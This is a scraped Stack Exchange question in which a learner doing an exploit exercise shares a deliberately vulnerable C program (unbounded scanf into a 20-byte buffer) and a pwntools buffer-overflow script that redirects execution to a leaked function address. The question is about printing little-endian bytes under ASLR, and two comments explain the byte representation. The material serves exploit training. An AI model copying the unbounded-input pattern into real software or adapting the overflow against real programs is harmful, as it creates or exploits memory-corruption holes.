{
    "title": "How do I convert an adress to little endian such that I can feed it to my exploit?",
    "link": "https://reverseengineering.stackexchange.com/questions/29989/how-do-i-convert-an-adress-to-little-endian-such-that-i-can-feed-it-to-my-exploi",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  I'm doing a small exploit exercise.\nFor this purpose, I have the following file:\n </p>\n <pre><code>#include <stdio.h>\nvoid secretFunction() { \n       printf(\"Congratulations!\n\");\n       printf(\"You have entered in the secret function!\n\");\n}\nvoid echo() { \n       char buffer[20];\n       printf(\"Enter some text:\n\"); \n       scanf(\"%s\", buffer); \n       printf(\"You entered: %s\n\", buffer);}\n\nint main() { \n     printf(\"%p \n\", secretFunction); echo();\n     return 0;\n }\n</code></pre>\n <p>\n  The basic idea is very simple, the program starts by outputting a memory adress for a secret function, and then the exploiter can overflow the buffer in the \"echo\" function\" and reroute the program to the adress of the secret function.\n </p>\n <p>\n  I used a pwntools template to make the exploit:\n </p>\n <pre><code>from pwn import *\nSet up pwntools for the correct architecture\ncontext.update(arch='i386') exe = './vuln_aslr'\ndef start(argv=[], *a, **kw):\n'''Start the exploit against the target.'''\n    if args.GDB:\n        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)\n    return process([exe] + argv, *a, **kw)\ngdbscript = ''' continue '''.format(**locals())\n#===========================================================\n#EXPLOIT GOES HERE\n#===========================================================\nio = start() addr = io.recvline() print(addr)\naddrINT = int(str(addr).replace(\"\\\n\" , \"\").replace(\"b\\'\", \"\").replace(\"'\", \"\").replace(\" \", \"\"),0)\nlittleEndianAddr = addrINT.to_bytes(length=4, byteorder=\"little\")\nprint(littleEndianAddr)\n\nmsg1  = io.recvline()\n\nprint(type(msg1))\nprint(msg1)\n\nio.sendline(32*b\"a\" + littleEndianAddr)\n\nio.interactive()\n</code></pre>\n <p>\n  So the important part is of course below \"EXPLOIT GOES HERE\". ( I know the addr line is really ugly)\nI first run this on a file  with aslr disabled. Here, the memory adress (the  \"addr\" variable) is:\n </p>\n <pre><code>b'0x80491d6 \n'\n</code></pre>\n <p>\n  I convert this variable to a int, and then use \"to_bytes\" to convert it to little endian input I can use.\nThis produces the littleEndianAddr variable that looks like this:\n </p>\n <pre><code>b'\\xd6\\x91\\x04\\x08'\n</code></pre>\n <p>\n  This I can just pass to the program, and my secret function will be invoked:\n </p>\n <pre><code>io.sendline(32*b\"a\" + littleEndianAddr)\n</code></pre>\n <p>\n  Now, this all works the way it should, but now I turn on aslr for my executable, and I try again.\nThis time, the memory adress of the secret function is:\n </p>\n <pre><code>b'0x5655f20d \n'\n</code></pre>\n <p>\n  But when this is converted to the little endian input that want to exploit with, I get this:\n </p>\n <pre><code>b'\\r\\xf2UV'\n</code></pre>\n <p>\n  The elements are simply their hex representation!\nAnd now my exploit doesnt work, my function never runs.\nI'm guessing this is because the littleEndianAddr just has regular chars, and is not understood as a memory adress by my computer.\n </p>\n <p>\n  Why is the second memory adress treated differently be \"to_bytes\"? What can I do to get a memory adress that works, that I can inject?\n </p>\n <p>\n  <strong>\n   EDIT\n  </strong>\n </p>\n <p>\n  I now tried the pwntools p32 function as well. The same thing happens here. If I have this sample code with the non-aslr adress:\n </p>\n <pre><code>In [1]: s = 0x80491d6\n\nIn [2]:  from pwn import *\n\nIn [3]: print(p32(s))\nb'\\xd6\\x91\\x04\\x08'\n</code></pre>\n <p>\n  But when I try the same thing with the aslr-leaked adress:\n </p>\n <pre><code>In [4]: s = 0x565cb20d\n\nIn [5]: print(p32(s))\nb'\\r\\xb2\\\\V'\n</code></pre>\n <p>\n  I guess the function does what it is supposed to do, since it just otuputs the ascii chars that represent the values, but how do I get it to print ion the format that I need?\nSuch that it works like a memoery adress\n </p>\n</div>\n</body></html>",
    "votes": "1",
    "answers": 0,
    "views": "767",
    "tags": [
        "python",
        "buffer-overflow"
    ],
    "user": "Grazosi",
    "time": "Feb 25, 2022 at 13:56",
    "comments": [
        {
            "user": "Paweł Łukasik",
            "text": "<html><body><span class=\"comment-copy\">\n This should work regardless of the form - bytes are bytes. If they are in printable range they will be printed as such, if they are outside printable range, they will be written as hex-encoded values. But the value is the same and you are sending the bytes anyway. From your code it doesn't looks like you need them in any specific form.\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "multithr3at3d",
            "text": "<html><body><span class=\"comment-copy\">\n This is a Python question, not an RE question. See\n <a href=\"https://stackoverflow.com/questions/29275085/python-string-to-escaped-hex\">\n  this\n </a>\n</span>\n</body></html>",
            "time": null
        }
    ],
    "answers_data": []
}